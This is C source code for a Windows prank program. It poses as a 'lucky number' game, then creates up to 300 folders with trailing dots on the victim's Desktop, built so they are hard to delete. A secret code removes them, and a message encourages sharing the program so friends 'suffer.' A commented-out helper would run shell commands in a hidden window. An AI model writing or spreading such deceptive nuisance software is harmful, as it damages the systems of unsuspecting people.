
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int limit = 300;
/*void run_hidden_cmd(const char *cmd) {
    if (!cmd || !cmd[0]) return; // Don't run empty commands
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    size_t len = strlen(cmd) + 20;
    char *cmdline = (char*)malloc(len);
    snprintf(cmdline, len, "cmd.exe /c \"%s\"", cmd);

    BOOL success = CreateProcessA(
        NULL, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi
    );

    if (success) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    free(cmdline);
}*/
int folder_exists(const char *fullPath) {
    char longPath[MAX_PATH * 4];

    // Add \\?\ prefix if not already present
    if (strncmp(fullPath, "\\\\?\\", 4) != 0) {
        snprintf(longPath, sizeof(longPath), "\\\\?\\%s", fullPath);
    } else {
        snprintf(longPath, sizeof(longPath), "%s", fullPath);
    }

    DWORD attrs = GetFileAttributesA(longPath);
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        return 0; // Folder does not exist
    }
    return (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0;
}

void create_cursed_folders(int num, const char *path) {
    for (int i = 0; i < num; i++) {
        char folder_path[500] = "";
        sprintf(folder_path, "\\\\?\\%s\\Cursed_%d.", path, i + 1);
        if (folder_exists(folder_path))   continue;
        CreateDirectoryA(folder_path, NULL);
    }
}

void delete_cursed_folders(const char *path) {
    for (int i = 0; i < limit; i++) {
            char folder_path[500] = "";
            sprintf(folder_path, "\\\\?\\%s\\Cursed_%d.", path, i + 1);
            if (!folder_exists(folder_path))  continue;
            RemoveDirectoryA(folder_path);
    }
}

// --- Input dialog with custom window proc ---
typedef struct {
    int result;
} DialogData;

LRESULT CALLBACK InputWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HWND hEdit;
    static DialogData *data;
    switch (msg) {
    case WM_CREATE: {
        data = (DialogData*)((LPCREATESTRUCT)lParam)->lpCreateParams;
        char msg[100] = "";
        sprintf(msg, "Enter your lucky number (1-%d):\r\n(Hint: The higher the better)", limit);
        CreateWindowA("STATIC",
            msg,
            WS_CHILD | WS_VISIBLE | SS_CENTER,
            10, 10, 360, 50,
            hwnd, NULL, GetModuleHandle(NULL), NULL);
        hEdit = CreateWindowA("EDIT", "",
            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
            10, 40, 360, 24,
            hwnd, (HMENU)1001, GetModuleHandle(NULL), NULL);
        CreateWindowA("BUTTON", "OK",
            WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
            70, 80, 80, 28,
            hwnd, (HMENU)IDOK, GetModuleHandle(NULL), NULL);
        CreateWindowA("BUTTON", "Cancel",
            WS_CHILD | WS_VISIBLE,
            180, 80, 80, 28,
            hwnd, (HMENU)IDCANCEL, GetModuleHandle(NULL), NULL);
        SetFocus(hEdit);
        break;
    }
    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK) {
            char buf[32];
            GetWindowTextA(hEdit, buf, sizeof(buf));
            int val = atoi(buf);
            if ((val >= 10 && val <= limit) || val == -143) {
                data->result = val;
                DestroyWindow(hwnd);
            } else {
                char msg[200] = "";
                sprintf(msg, "Please enter a positive number between 10 and %d.", limit);
                MessageBoxA(hwnd, msg, "Invalid Input", MB_ICONWARNING);
                SetWindowTextA(hEdit, "");
            }
        } else if (LOWORD(wParam) == IDCANCEL) {
            data->result = 0;
            DestroyWindow(hwnd);
        }
        break;
    case WM_CLOSE:
        data->result = 0;
        DestroyWindow(hwnd);
        break;
    }
    return DefWindowProcA(hwnd, msg, wParam, lParam);
}

int get_lucky_number(HWND hWnd) {
    const char CLASS_NAME[] = "LuckyInputClass";
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = InputWndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = CLASS_NAME;
    RegisterClassA(&wc);

    DialogData data = {0};

    // Center window
    int width = 400, height = 200;
    RECT rcScreen;
    SystemParametersInfo(SPI_GETWORKAREA, 0, &rcScreen, 0);
    int x = rcScreen.left + (rcScreen.right - rcScreen.left - width) / 2;
    int y = rcScreen.top + (rcScreen.bottom - rcScreen.top - height) / 2;

    HWND hwnd = CreateWindowExA(
        WS_EX_DLGMODALFRAME | WS_EX_TOPMOST,
        CLASS_NAME,
        "Friend scream simulator",
        WS_OVERLAPPED | WS_SYSMENU,
        x, y, width, height,
        hWnd, NULL, GetModuleHandle(NULL), &data);

    ShowWindow(hwnd, SW_SHOW);
    EnableWindow(hWnd, FALSE);

    // Modal message loop
    MSG msg;
    while (IsWindow(hwnd) && GetMessage(&msg, NULL, 0, 0)) {
        if (!IsDialogMessage(hwnd, &msg)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    EnableWindow(hWnd, TRUE);
    UnregisterClassA(CLASS_NAME, GetModuleHandle(NULL));
    return data.result;
}

int main() {
    char desktop[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop) != S_OK) {
        MessageBoxA(NULL, "Could not find Desktop path.", "Error", MB_ICONERROR);
        return 1;
    }

    int lucky = 0;
    while (1) {
        lucky = get_lucky_number(NULL);
        if (lucky == 0) break; // Cancel or close
        if ((lucky >= 10 && lucky <= limit) || lucky == -143) break;
        char msg[100] = "";
        sprintf(msg, "Please enter a positive number between 10 and %d.", limit);
        MessageBoxA(NULL, msg, "Invalid Input", MB_ICONWARNING);
    }

    if (lucky == -143) {
        delete_cursed_folders(desktop);
        MessageBoxA(NULL, "Deleted cursed folders.\nShare with your friends and see them suffer like you did.\n", "Done", MB_OK | MB_ICONINFORMATION);
    } else if (lucky > 0) {
        char msg[500] = "";
        sprintf(msg, "Good luck deleting those %d folders on Desktop!\nYou're welcome.", lucky);
        MessageBoxA(NULL, msg, "Done", MB_OK | MB_ICONINFORMATION);
        create_cursed_folders(lucky, desktop);
    }
    return 0;
}
